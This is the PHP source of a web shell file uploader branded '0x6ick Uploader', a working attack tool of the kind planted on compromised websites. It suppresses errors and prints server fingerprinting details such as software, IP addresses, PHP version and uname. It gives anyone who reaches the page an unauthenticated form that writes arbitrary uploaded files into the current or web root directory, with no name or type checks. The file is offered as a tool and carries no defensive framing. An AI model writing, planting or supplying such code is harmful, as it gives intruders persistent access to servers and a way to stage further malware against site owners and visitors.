<?php
// 0x6ick Uploader - Merged

error_reporting(0);
$dir = __DIR__;
$root = $_SERVER['DOCUMENT_ROOT'];
$web = "http://" . $_SERVER['HTTP_HOST'] . "/";
?>

<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h2>0x6ick Uploader</h2>
<!-- Server Info -->
  <small>  <b>Server Info:</b><br>
    Software: <?= $_SERVER['SERVER_SOFTWARE']; ?><br>
    Server IP: <?= $_SERVER['SERVER_ADDR']; ?><br>
    Client IP: <?= $_SERVER['REMOTE_ADDR']; ?><br>
    PHP Version: <?= phpversion(); ?><br>
     <b><?= php_uname(); ?></b><br>
    <b>Working Dir: <?= $dir; ?></b><br><br>

    <!-- Form Uploader V2 (with dir selection) -->
    <form method='post' enctype='multipart/form-data'>
        <select name="directory">
            <option value="2">Upload to current dir</option>
            <option value="1">Upload to home dir</option>
        </select><br>
        <input type='file' name='nax_file'>
        <input type='submit' name='upload' value='upload'>
    </form></small>
    <br>

    <?php
    if (isset($_POST['upload'])) {
        $files = $_FILES['nax_file']['name'];

        if ($_POST['directory'] == '1') {
            $dest = $root . '/' . $files;

            if (is_writable($root)) {
                if (move_uploaded_file($_FILES['nax_file']['tmp_name'], $dest)) {
                    echo "UPLOADED TO HOME DIR >> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a><br>";
                } else {
                    echo "[-] Upload failed to home dir.<br>";
                }
            } else {
                echo "[-] Home dir is not writable.<br>";
            }
        } else {
            if (move_uploaded_file($_FILES['nax_file']['tmp_name'], $files)) {
                echo "UPLOADED TO CURRENT DIR >> <a href='$files' target='_blank'><b><u>$files</u></b></a><br>";
            } else {
                echo "[-] Upload failed to current dir.<br>";
            }
        }
    }
    ?>
</body>
</html>
